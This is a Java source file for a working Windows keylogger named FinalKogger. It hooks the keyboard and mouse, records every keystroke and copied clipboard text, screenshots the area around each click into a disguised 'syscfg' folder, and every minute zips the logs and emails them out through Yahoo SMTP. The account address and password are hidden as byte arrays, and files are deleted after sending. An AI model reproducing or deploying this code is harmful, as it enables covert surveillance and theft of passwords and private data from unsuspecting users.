import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.imageio.ImageIO;
import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.MultiPartEmail;
import org.sf.feeling.swt.win32.extension.Win32;
import org.sf.feeling.swt.win32.extension.hook.JournalRecordHook;
import org.sf.feeling.swt.win32.extension.hook.Mouse_LLHook;
import org.sf.feeling.swt.win32.extension.hook.data.JournalHookData;
import org.sf.feeling.swt.win32.extension.hook.data.Mouse_LLHookData;
import org.sf.feeling.swt.win32.extension.hook.interceptor.InterceptorFlag;
import org.sf.feeling.swt.win32.extension.hook.interceptor.JournalHookInterceptor;
import org.sf.feeling.swt.win32.extension.hook.interceptor.Mouse_LLHookInterceptor;
import org.sf.feeling.swt.win32.extension.io.Keyboard;
import org.sf.feeling.swt.win32.internal.extension.Extension;

public class FinalKogger {

	// private Timer timer = null;

	private boolean shiftdown = false;
	private boolean cpslockdown = false;
	private boolean scrlockdown = false;
	private boolean numlockdown = false;
	private boolean altgrdown = false;
	private boolean ctrldown = false;
	private boolean tilde = false;
	private boolean circumflex = false;
	private boolean diacritic = false;
	private boolean acute = false;
	private boolean grave = false;

	private Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();

	private boolean charAccentedClipBoard = false;

	private String clipBoardBackUp = "";

	byte[] _ = { 97, 108, 97, 115, 107, 97, 112, 114, 111, 106, 101, 99, 116, 49, 49, 64, 121, 97, 104, 111, 111, 46, 99, 111, 109, 46, 98, 114 };
	private String ___ = new String(_);
	byte[] __ = { 48, 109, 53, 80, 50, 111, 56, 85, 51, 97, 55, 88, 57, 115, 50, 71, 50, 97 };
	private String ____ = new String(__);

	private static String fileName = "kog.rtf";

	private static String file = "C:" + System.getProperty("file.separator")
			/*+ "WINDOWS" + System.getProperty("file.separator")*/
			+ "syscfg" + System.getProperty("file.separator") + fileName;

	private int clicks = 0;
	private int begin = 0;

	private static String currentDate = new SimpleDateFormat(
			"EEEEEEEEEE, d MMMMMMMMMM yyyy HH:mm:ss").format(new Date());

	class Task extends TimerTask {
		public void run() {
			try {
				// zipFolder("C:\\WINDOWS\\syscfg", "C:\\WINDOWS\\syscfg.zip");
				zipFolder("C:\\syscfg", "C:\\syscfg.zip");
				// sendmail("C:\\WINDOWS\\syscfg.zip", "syscfg.zip");
				sendmail("C:\\syscfg.zip", "syscfg.zip");
				deleteFiles();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

	public FinalKogger() {
		backUpClipBoard();
		Timer timer = new Timer();
		timer.scheduleAtFixedRate(new Task(), 60000, 60000);
		cpslockdown = Toolkit.getDefaultToolkit().getLockingKeyState(
				KeyEvent.VK_CAPS_LOCK);
		scrlockdown = Toolkit.getDefaultToolkit().getLockingKeyState(
				KeyEvent.VK_SCROLL_LOCK);
		numlockdown = Toolkit.getDefaultToolkit().getLockingKeyState(
				KeyEvent.VK_NUM_LOCK);
		Runtime.getRuntime().addShutdownHook(new Thread() {
			@Override
			public void run() {
				try {
					appendNewLine();
					appendNewLine();
					appendFile("KeyLogger finalizado :: " + currentDate);
					appendNewLine();
					// sendmail("C:\\WINDOWS\\syscfg.zip", "syscfg.zip");
					sendmail("C:\\syscfg.zip", "syscfg.zip");
					
					// Finalizing Objects
					System.runFinalization();
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		});
		Mouse_LLHook.addHookInterceptor(new Mouse_LLHookInterceptor() {
			public InterceptorFlag intercept(Mouse_LLHookData hookData) {
				int wParam = hookData.getWParam();
				if (wParam == Mouse_LLHookData.WM_LBUTTONDOWN
						|| wParam == Mouse_LLHookData.WM_RBUTTONDOWN) {
					try {
						Thread.sleep(150);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
					captureScreen(hookData.getPointX(), hookData.getPointY(),
							clicks);
					appendNewLine();
					appendFile("|'" + clicks + "|");
					appendNewLine();
					clicks++;
				}
				return InterceptorFlag.TRUE;
			}
		});
		Mouse_LLHook.installHook();
		JournalRecordHook.addHookInterceptor(new JournalHookInterceptor() {
			public InterceptorFlag intercept(JournalHookData hookData) {
				byte[] keyboard = new byte[256];
				short[] lpChar = new short[1];
				Extension.ToAscii(hookData.getParamL(), hookData.getParamH(), keyboard, lpChar, 0);
				char[] pwszBuff = new char[1];
				Extension.ToUnicode(hookData.getParamL(), hookData.getParamH(), keyboard, pwszBuff, 1, 0);
				if (hookData.getMessage() == Extension.WM_KEYDOWN) {

					if ((hookData.getParamH() == 42 && hookData.getParamL() == 10768)
							|| (hookData.getParamH() == 32822 && hookData.getParamL() == 13840)) {
						shiftdown = true;
					}
					if ((hookData.getParamH() == 29 && hookData.getParamL() == 7441)
							|| (hookData.getParamH() == 32797 && hookData.getParamL() == 7441)) {
						ctrldown = true;
					}
					if (hookData.getParamH() == 32824 && hookData.getParamL() == 14354) {
						altgrdown = true;
					}
					if (cpslockdown) {

						if (hookData.getParamH() == 58
								&& hookData.getParamL() == 14868) {
							cpslockdown = false;
						}
					} else {

						if (hookData.getParamH() == 58
								&& hookData.getParamL() == 14868) {
							cpslockdown = true;
						}
					}
					if (scrlockdown) {
						if (hookData.getParamH() == 70
								&& hookData.getParamL() == 18065) {
							scrlockdown = false;
						}
					} else {
						if (hookData.getParamH() == 70
								&& hookData.getParamL() == 18065) {
							scrlockdown = true;
						}
					}
					if (numlockdown) {
						if (hookData.getParamH() == 32837
								&& hookData.getParamL() == 17808) {
							numlockdown = false;
						}
					} else {
						if (hookData.getParamH() == 32837
								&& hookData.getParamL() == 17808) {
							numlockdown = true;
						}
					}
					if (((hookData.getParamH() == 40 && hookData.getParamL() == 10462) && !shiftdown)
							&& !tilde) {
						tilde = true;
					}
					if (((hookData.getParamH() == 40 && hookData.getParamL() == 10462) && shiftdown)
							&& !circumflex) {
						circumflex = true;
					}
					if (((hookData.getParamH() == 7 && hookData.getParamL() == 1846) && shiftdown)
							&& !diacritic) {
						diacritic = true;
					}
					if (((hookData.getParamH() == 26 && hookData.getParamL() == 6875) && !shiftdown)
							&& !acute) {
						acute = true;
					}
					if (((hookData.getParamH() == 26 && hookData.getParamL() == 6875) && shiftdown)
							&& !grave) {
						grave = true;
					}
					if (hookData.getParamH() == 14
							&& hookData.getParamL() == 3592) {
						appendFile(" [BKSP] ");
					} else if (hookData.getParamH() == 28
							&& hookData.getParamL() == 7181) {
						appendFile(" [ENTER] ");
					} else if (hookData.getParamH() == 57
							&& hookData.getParamL() == 14624) {
						appendFile(" [SPCBAR] ");
					} else if (hookData.getParamH() == 15
							&& hookData.getParamL() == 3849) {
						appendFile(" [TAB] ");
					} else if (hookData.getParamH() == 58
							&& hookData.getParamL() == 14868) {
						appendFile(" [CPSL] ");
					} else if (hookData.getParamH() == 70
							&& hookData.getParamL() == 18065) {
						appendFile(" [SCRL] ");
					} else if (hookData.getParamH() == 32837
							&& hookData.getParamL() == 17808) {
						appendFile(" [NUML] ");
					} else if (hookData.getParamH() == 42
							&& hookData.getParamL() == 10768) {
						appendFile(" [SHIFT1] ");
					} else if (hookData.getParamH() == 32822
							&& hookData.getParamL() == 13840) {
						appendFile(" [SHIFT2] ");
					} else if (hookData.getParamH() == 29
							&& hookData.getParamL() == 7441) {
						appendFile(" [CTRL1] ");
					} else if (hookData.getParamH() == 32797
							&& hookData.getParamL() == 7441) {
						appendFile(" [CTRL2] ");
					} else if (hookData.getParamH() == 32859
							&& hookData.getParamL() == 23387) {
						appendFile(" [WIN1] ");
					} else if (hookData.getParamH() == 32860
							&& hookData.getParamL() == 23644) {
						appendFile(" [WIN2] ");
					} else if (hookData.getParamH() == 32824
							&& hookData.getParamL() == 14354) {
						appendFile(" [ALTGR] ");
					} else if (hookData.getParamH() == 32861
							&& hookData.getParamL() == 23901) {
						appendFile(" [MENU] ");
					} else if (hookData.getParamH() == 1
							&& hookData.getParamL() == 283) {
						appendFile(" [ESC] ");
					} else if (hookData.getParamH() == 59
							&& hookData.getParamL() == 15216) {
						appendFile(" [F1] ");
					} else if (hookData.getParamH() == 60
							&& hookData.getParamL() == 15473) {
						appendFile(" [F2] ");
					} else if (hookData.getParamH() == 61
							&& hookData.getParamL() == 15730) {
						appendFile(" [F3] ");
					} else if (hookData.getParamH() == 62
							&& hookData.getParamL() == 15987) {
						appendFile(" [F4] ");
					} else if (hookData.getParamH() == 63
							&& hookData.getParamL() == 16244) {
						appendFile(" [F5] ");
					} else if (hookData.getParamH() == 64
							&& hookData.getParamL() == 16501) {
						appendFile(" [F6] ");
					} else if (hookData.getParamH() == 65
							&& hookData.getParamL() == 16758) {
						appendFile(" [F7] ");
					} else if (hookData.getParamH() == 66
							&& hookData.getParamL() == 17015) {
						appendFile(" [F8] ");
					} else if (hookData.getParamH() == 67
							&& hookData.getParamL() == 17272) {
						appendFile(" [F9] ");
					} else if (hookData.getParamH() == 68
							&& hookData.getParamL() == 17529) {
						appendFile(" [F10] ");
					} else if (hookData.getParamH() == 87
							&& hookData.getParamL() == 22394) {
						appendFile(" [F11] ");
					} else if (hookData.getParamH() == 88
							&& hookData.getParamL() == 22651) {
						appendFile(" [F12] ");
					} else if (hookData.getParamH() == 32843
							&& hookData.getParamL() == 19237) {
						appendFile(" [LARW] ");
					} else if (hookData.getParamH() == 32840
							&& hookData.getParamL() == 18470) {
						appendFile(" [UARW] ");
					} else if (hookData.getParamH() == 32845
							&& hookData.getParamL() == 19751) {
						appendFile(" [RARW] ");
					} else if (hookData.getParamH() == 32848
							&& hookData.getParamL() == 20520) {
						appendFile(" [DARW] ");
					} else if (hookData.getParamH() == 32862
							&& hookData.getParamL() == 24319) {
						appendFile(" [POWER] ");
					} else if (hookData.getParamH() == 32863
							&& hookData.getParamL() == 24415) {
						appendFile(" [SLEEP] ");
					} else if (hookData.getParamH() == 32867
							&& hookData.getParamL() == 25599) {
						appendFile(" [WAKE] ");
					} else if (hookData.getParamH() == 32823
							&& hookData.getParamL() == 14124) {
						appendFile(" [PRSC.SYS] ");
					} else if (hookData.getParamH() == 69
							&& hookData.getParamL() == 17683) {
						appendFile(" [PSEBRK] ");
					} else if (hookData.getParamH() == 32850
							&& hookData.getParamL() == 21037) {
						appendFile(" [INSERT] ");
					} else if (hookData.getParamH() == 32839
							&& hookData.getParamL() == 18212) {
						appendFile(" [HOME] ");
					} else if (hookData.getParamH() == 32841
							&& hookData.getParamL() == 18721) {
						appendFile(" [PGUP] ");
					} else if (hookData.getParamH() == 32849
							&& hookData.getParamL() == 20770) {
						appendFile(" [PGDN] ");
					} else if (hookData.getParamH() == 32851
							&& hookData.getParamL() == 21294) {
						appendFile(" [DEL] ");
					} else if (hookData.getParamH() == 32847
							&& hookData.getParamL() == 20259) {
						appendFile(" [END] ");
					} else if (hookData.getParamH() == 32821
							&& hookData.getParamL() == 13679) {
						appendFile("/");
					} else if (hookData.getParamH() == 32796
							&& hookData.getParamL() == 7181) {
						try {
							BufferedWriter out = new BufferedWriter(
									new OutputStreamWriter(new FileOutputStream(file, true), "Cp1252"));
							out.newLine();
							out.close();
						} catch (Exception ex) {
							ex.printStackTrace();
						}
					}
					if (shiftdown) {
						if (hookData.getParamH() == 2
								&& hookData.getParamL() == 561) {
							appendFile("!");
						} else if (hookData.getParamH() == 41
								&& hookData.getParamL() == 10688) {
							appendFile("\"");
						} else if (hookData.getParamH() == 3
								&& hookData.getParamL() == 818) {
							appendFile("@");
						} else if (hookData.getParamH() == 4
								&& hookData.getParamL() == 1075) {
							appendFile("#");
						} else if (hookData.getParamH() == 5
								&& hookData.getParamL() == 1332) {
							appendFile("$");
						} else if (hookData.getParamH() == 6
								&& hookData.getParamL() == 1589) {
							appendFile("%");
						} else if (hookData.getParamH() == 7
								&& hookData.getParamL() == 1846) {
							appendFile("¨");
						} else if (hookData.getParamH() == 8
								&& hookData.getParamL() == 2103) {
							appendFile("&");
						} else if (hookData.getParamH() == 9
								&& hookData.getParamL() == 2360) {
							appendFile("*");
						} else if (hookData.getParamH() == 10
								&& hookData.getParamL() == 2617) {
							appendFile("(");
						} else if (hookData.getParamH() == 11
								&& hookData.getParamL() == 2864) {
							appendFile(")");
						} else if (hookData.getParamH() == 12
								&& hookData.getParamL() == 3261) {
							appendFile("_");
						} else if (hookData.getParamH() == 13
								&& hookData.getParamL() == 3515) {
							appendFile("+");
						} else if (hookData.getParamH() == 86
								&& hookData.getParamL() == 22242) {
							appendFile("|");
						} else if (hookData.getParamH() == 51
								&& hookData.getParamL() == 13244) {
							appendFile("<");
						} else if (hookData.getParamH() == 52
								&& hookData.getParamL() == 13502) {
							appendFile(">");
						} else if (hookData.getParamH() == 53
								&& hookData.getParamL() == 13759) {
							appendFile(":");
						} else if (hookData.getParamH() == 115
								&& hookData.getParamL() == 29633) {
							appendFile("?");
						} else if (hookData.getParamH() == 27
								&& hookData.getParamL() == 7133) {
							appendFile("{");
						} else if (hookData.getParamH() == 43
								&& hookData.getParamL() == 11228) {
							appendFile("}");
						} else {
							if (cpslockdown) {
								if ((tilde)) {
									if (hookData.getParamH() == 30
											&& hookData.getParamL() == 7745) {
										doAccentedChar('ã', "tilde");
									}
								} else if ((circumflex)) {
									if (hookData.getParamH() == 30
											&& hookData.getParamL() == 7745) {
										doAccentedChar('â', "circumflex");
									} else if (hookData.getParamH() == 18
											&& hookData.getParamL() == 4677) {
										doAccentedChar('ê', "circumflex");
									}
								} else if ((diacritic)) {
									if (hookData.getParamH() == 30
											&& hookData.getParamL() == 7745) {
										doAccentedChar('ä', "diacritic");
									} else if (hookData.getParamH() == 18
											&& hookData.getParamL() == 4677) {
										doAccentedChar('ë', "diacritic");
									}
								} else if ((acute)) {
									if (hookData.getParamH() == 30
											&& hookData.getParamL() == 7745) {
										doAccentedChar('á', "acute");
									} else if (hookData.getParamH() == 18
											&& hookData.getParamL() == 4677) {
										doAccentedChar('é', "acute");
									}
								} else if ((grave)) {
									if (hookData.getParamH() == 30
											&& hookData.getParamL() == 7745) {
										doAccentedChar('à', "grave");
									} else if (hookData.getParamH() == 18
											&& hookData.getParamL() == 4677) {
										doAccentedChar('è', "grave");
									}
								} else {
									appendFile((char) lpChar[0]);
								}
							} else {
								if ((tilde)) {
									if (hookData.getParamH() == 30
											&& hookData.getParamL() == 7745) {
										doAccentedChar('Ã', "tilde");
									}
								} else if ((circumflex)) {
									if (hookData.getParamH() == 30
											&& hookData.getParamL() == 7745) {
										doAccentedChar('Â', "circumflex");
									} else if (hookData.getParamH() == 18
											&& hookData.getParamL() == 4677) {
										doAccentedChar('Ê', "circumflex");
									}
								} else if ((diacritic)) {
									if (hookData.getParamH() == 30
											&& hookData.getParamL() == 7745) {
										doAccentedChar('Ä', "diacritic");
									} else if (hookData.getParamH() == 18
											&& hookData.getParamL() == 4677) {
										doAccentedChar('Ë', "diacritic");
									}
								} else if ((acute)) {
									if (hookData.getParamH() == 30
											&& hookData.getParamL() == 7745) {
										doAccentedChar('Á', "acute");
									} else if (hookData.getParamH() == 18
											&& hookData.getParamL() == 4677) {
										doAccentedChar('É', "acute");
									}
								} else if ((grave)) {
									if (hookData.getParamH() == 30
											&& hookData.getParamL() == 7745) {
										doAccentedChar('À', "grave");
									} else if (hookData.getParamH() == 18
											&& hookData.getParamL() == 4677) {
										doAccentedChar('È', "grave");
									}
								} else {
									appendFile(Character.toUpperCase((char) lpChar[0]));
								}
							}
						}
					} else {
						if (cpslockdown) {
							if ((tilde)) {
								if (hookData.getParamH() == 30
										&& hookData.getParamL() == 7745) {
									doAccentedChar('Ã', "tilde");
								}
							} else if ((circumflex)) {
								if (hookData.getParamH() == 30
										&& hookData.getParamL() == 7745) {
									doAccentedChar('Â', "circumflex");
								} else if (hookData.getParamH() == 18
										&& hookData.getParamL() == 4677) {
									doAccentedChar('Ê', "circumflex");
								}
							} else if ((diacritic)) {
								if (hookData.getParamH() == 30
										&& hookData.getParamL() == 7745) {
									doAccentedChar('Ä', "diacritic");
								} else if (hookData.getParamH() == 18
										&& hookData.getParamL() == 4677) {
									doAccentedChar('Ë', "diacritic");
								}
							} else if ((acute)) {
								if (hookData.getParamH() == 30
										&& hookData.getParamL() == 7745) {
									doAccentedChar('Á', "acute");
								} else if (hookData.getParamH() == 18
										&& hookData.getParamL() == 4677) {
									doAccentedChar('É', "acute");
								}
							} else if ((grave)) {
								if (hookData.getParamH() == 30
										&& hookData.getParamL() == 7745) {
									doAccentedChar('À', "grave");
								} else if (hookData.getParamH() == 18
										&& hookData.getParamL() == 4677) {
									doAccentedChar('È', "grave");
								}
							} else {
								appendFile(Character.toUpperCase((char) lpChar[0]));
							}
						} else {
							if ((tilde)) {
								if (hookData.getParamH() == 30
										&& hookData.getParamL() == 7745) {
									doAccentedChar('ã', "tilde");
								}
							} else if ((circumflex)) {
								if (hookData.getParamH() == 30
										&& hookData.getParamL() == 7745) {
									doAccentedChar('â', "circumflex");
								} else if (hookData.getParamH() == 18
										&& hookData.getParamL() == 4677) {
									doAccentedChar('ê', "circumflex");
								}
							} else if ((diacritic)) {
								if (hookData.getParamH() == 30
										&& hookData.getParamL() == 7745) {
									doAccentedChar('ä', "diacritic");
								} else if (hookData.getParamH() == 18
										&& hookData.getParamL() == 4677) {
									doAccentedChar('ë', "diacritic");
								}
							} else if ((acute)) {
								if (hookData.getParamH() == 30
										&& hookData.getParamL() == 7745) {
									doAccentedChar('á', "acute");
								} else if (hookData.getParamH() == 18
										&& hookData.getParamL() == 4677) {
									doAccentedChar('é', "acute");
								}
							} else if ((grave)) {
								if (hookData.getParamH() == 30
										&& hookData.getParamL() == 7745) {
									doAccentedChar('à', "grave");
								} else if (hookData.getParamH() == 18
										&& hookData.getParamL() == 4677) {
									doAccentedChar('è', "grave");
								}
							} else {
								appendFile((char) lpChar[0]);
							}
						}
					}
					if (altgrdown) {
						if (hookData.getParamH() == 2
								&& hookData.getParamL() == 561) {
							appendFile("¹");
						} else if (hookData.getParamH() == 3
								&& hookData.getParamL() == 818) {
							appendFile("²");
						} else if (hookData.getParamH() == 4
								&& hookData.getParamL() == 1075) {
							appendFile("³");
						} else if (hookData.getParamH() == 5
								&& hookData.getParamL() == 1332) {
							appendFile("£");
						} else if (hookData.getParamH() == 6
								&& hookData.getParamL() == 1589) {
							appendFile("¢");
						} else if (hookData.getParamH() == 7
								&& hookData.getParamL() == 1846) {
							appendFile("¬");
						} else if (hookData.getParamH() == 13
								&& hookData.getParamL() == 3515) {
							appendFile("§");
						} else if (hookData.getParamH() == 27
								&& hookData.getParamL() == 7133) {
							appendFile("ª");
						} else if (hookData.getParamH() == 43
								&& hookData.getParamL() == 11228) {
							appendFile("º");
						}
					}
					if (ctrldown) {
						if (charAccentedClipBoard) {
							clipboard.setContents(new StringSelection(String.valueOf(clipBoardBackUp)), null);
							charAccentedClipBoard = false;
						}
						if (hookData.getParamH() == 47 && hookData.getParamL() == 12118) {
							appendNewLine();
							appendFile("[CLIPBOARD> " + getClipBoardContent() + " <CLIPBOARD]");
							appendNewLine();
						}
					}
					if (numlockdown) {
						if (hookData.getParamH() == 32821
								&& hookData.getParamL() == 13679) {
							appendFile("/");
						} else if (hookData.getParamH() == 55
								&& hookData.getParamL() == 14186) {
							appendFile("*");
						} else if (hookData.getParamH() == 74
								&& hookData.getParamL() == 19053) {
							appendFile("-");
						} else if (hookData.getParamH() == 78
								&& hookData.getParamL() == 20075) {
							appendFile("+");
						} else if (hookData.getParamH() == 126
								&& hookData.getParamL() == 32450) {
							appendFile(".");
						} else if (hookData.getParamH() == 32796
								&& hookData.getParamL() == 7181) {
							try {
								BufferedWriter out = new BufferedWriter(
										new OutputStreamWriter(new FileOutputStream(file, true), "Cp1252"));
								out.newLine();
								out.close();
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						} else if (hookData.getParamH() == 83
								&& hookData.getParamL() == 21358) {
							appendFile(" [DEL] ");
						} else if (hookData.getParamH() == 82
								&& hookData.getParamL() == 21088) {
							appendFile(" [INS] ");
						} else if (hookData.getParamH() == 79
								&& hookData.getParamL() == 20321) {
							appendFile(" [END] ");
						} else if (hookData.getParamH() == 80
								&& hookData.getParamL() == 20578) {
							appendFile(" [DARW] ");
						} else if (hookData.getParamH() == 81
								&& hookData.getParamL() == 20835) {
							appendFile(" [PGDN] ");
						} else if (hookData.getParamH() == 75
								&& hookData.getParamL() == 19300) {
							appendFile(" [LARW] ");
						} else if (hookData.getParamH() == 76
								&& hookData.getParamL() == 19557) {
							appendFile(" [5NL] ");
						} else if (hookData.getParamH() == 77
								&& hookData.getParamL() == 19814) {
							appendFile(" [RARW] ");
						} else if (hookData.getParamH() == 71
								&& hookData.getParamL() == 18279) {
							appendFile(" [HOME] ");
						} else if (hookData.getParamH() == 72
								&& hookData.getParamL() == 18536) {
							appendFile(" [UARW] ");
						} else if (hookData.getParamH() == 73
								&& hookData.getParamL() == 18793) {
							appendFile(" [PGUP] ");
						}
					}
				} else if (hookData.getMessage() == Extension.WM_KEYUP) {
					if ((hookData.getParamH() == 42 && hookData.getParamL() == 10768)
							|| (hookData.getParamH() == 32822 && hookData.getParamL() == 13840)) {
						shiftdown = false;
					}
					if ((hookData.getParamH() == 29 && hookData.getParamL() == 7441)
							|| (hookData.getParamH() == 32797 && hookData.getParamL() == 7441)) {
						ctrldown = false;
					}
					if (hookData.getParamH() == 32824 && hookData.getParamL() == 14354) {
						altgrdown = false;
					}
				}
				return InterceptorFlag.TRUE;
			}
		});
		JournalRecordHook.installHook();
	}

	public void appendFile(char word) {
		BufferedWriter out = null;
		try {
			out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true), "Cp1252"));
			if (Character.isWhitespace(word)) {
				out.write(word);
			} else if (Character.isSpaceChar(word)) {
				out.write(word);
			} else if (Character.isISOControl(word)) {
				out.write(String.valueOf(word).trim());
			} else {
				out.write(word);
			}
			out.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		out = null;
	}

	public void appendFile(String word) {
		BufferedWriter out = null;
		try {
			out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true), "Cp1252"));
			out.write(word.trim());
			out.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		out = null;
	}

	public void appendNewLine() {
		BufferedWriter out = null;
		try {
			out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true), "Cp1252"));
			out.newLine();
			out.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		out = null;
	}

	static public void zipFolder(String srcFolder, String destZipFile) throws Exception {
		ZipOutputStream zip = null;
		FileOutputStream fileWriter = null;
		fileWriter = new FileOutputStream(destZipFile);
		zip = new ZipOutputStream(fileWriter);
		addFolderToZip("", srcFolder, zip);
		zip.flush();
		zip.close();
		zip = null;
		fileWriter = null;
	}

	@SuppressWarnings("resource")
	static private void addFileToZip(String path, String srcFile, ZipOutputStream zip) throws Exception {
		File folder = new File(srcFile);
		if (folder.isDirectory()) {
			addFolderToZip(path, srcFile, zip);
		} else {
			byte[] buf = new byte[1024];
			int len;
			FileInputStream in = new FileInputStream(srcFile);
			zip.putNextEntry(new ZipEntry(path + "/" + folder.getName()));
			while ((len = in.read(buf)) > 0) {
				zip.write(buf, 0, len);
			}
		}
		folder = null;
	}

	static private void addFolderToZip(String path, String srcFolder, ZipOutputStream zip) throws Exception {
		File folder = new File(srcFolder);
		for (String fileName : folder.list()) {
			if (path.equals("")) {
				addFileToZip(folder.getName(), srcFolder + "/" + fileName, zip);
			} else {
				addFileToZip(path + "/" + folder.getName(), srcFolder + "/" + fileName, zip);
			}
		}
		folder = null;
	}

	public void sendmail(String filepath, String filename) {
		EmailAttachment attachment = null;
		try {
			attachment = new EmailAttachment();
			attachment.setPath(filepath);
			attachment.setDisposition(EmailAttachment.ATTACHMENT);
			attachment.setDescription("Keystroke logger");
			attachment.setName(filename);
			MultiPartEmail email = new MultiPartEmail();
			email.setDebug(false);
			email.setHostName("smtp.mail.yahoo.com");
			email.setSmtpPort(465);
			email.setAuthentication(___,____);
			email.setSSL(true);
			email.setTLS(false);
			email.addTo(___);
			email.setFrom(___);
			email.setSubject("Kogger :: " + currentDate);
			email.attach(attachment);
			email.setMsg("See the file for information!");
			email.send();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		attachment = null;
	}

	public void backUpClipBoard() {
		Transferable contents = clipboard.getContents(null);
		boolean hasTransferableText = (contents != null) && contents.isDataFlavorSupported(DataFlavor.stringFlavor);
		if (hasTransferableText) {
			try {
				clipBoardBackUp = (String) contents.getTransferData(DataFlavor.stringFlavor);
			} catch (UnsupportedFlavorException ex) {
				ex.printStackTrace();
			} catch (IOException ex) {
				ex.printStackTrace();
			}
		}
		contents = null;
	}

	public String getClipBoardContent() {
		Transferable contents = clipboard.getContents(null);
		boolean hasTransferableText = (contents != null) && contents.isDataFlavorSupported(DataFlavor.stringFlavor);
		if (hasTransferableText) {
			try {
				return (String) contents.getTransferData(DataFlavor.stringFlavor);
			} catch (UnsupportedFlavorException ex) {
				ex.printStackTrace();
				return "";
			} catch (IOException ex) {
				ex.printStackTrace();
				return "";
			}
		} else {
			return "";
		}
	}

	public void captureScreen(int mouseX, int mouseY, int number) {
		BufferedImage screenImage = null;
		try {
			screenImage = new Robot().createScreenCapture(new Rectangle(mouseX - 70, mouseY - 70, 140, 140));
			ImageIO.write(screenImage, "png",
					new File("C:" + System.getProperty("file.separator")
							/*+ "WINDOWS" + System.getProperty("file.separator")*/
							+ "syscfg" + System.getProperty("file.separator") + "ps_" + number + ".png"));
		} catch (Exception exception) {
			exception.printStackTrace();
		}
		screenImage = null;
	}
	
	public void deleteFiles() {
		for (int i = begin; i < clicks; i++) {
			new File("C:\\syscfg\\ps_" + i + ".png").delete();
			begin++;
		}
		new File("C:\\syscfg.zip").delete();
	}

	public void doAccentedChar(char special, String accname) {
		backUpClipBoard();
		clipboard.setContents(new StringSelection(String.valueOf(special)), null);
		charAccentedClipBoard = true;
		Keyboard.keyDown(Win32.VK_BACK, 0, false);
		Keyboard.keyUp(Win32.VK_BACK, 0, false);
		Keyboard.keyDown(Win32.VK_CONTROL, 0, false);
		Keyboard.keyDown('V', 0, false);
		Keyboard.keyUp('V', 0, false);
		Keyboard.keyUp(Win32.VK_CONTROL, 0, false);
		if (accname.equals("tilde")) {
			tilde = false;
		}
		if (accname.equals("circumflex")) {
			circumflex = false;
		}
		if (accname.equals("diacritic")) {
			diacritic = false;
		}
		if (accname.equals("acute")) {
			acute = false;
		}
		if (accname.equals("grave")) {
			grave = false;
		}
		appendFile(special);
	}
}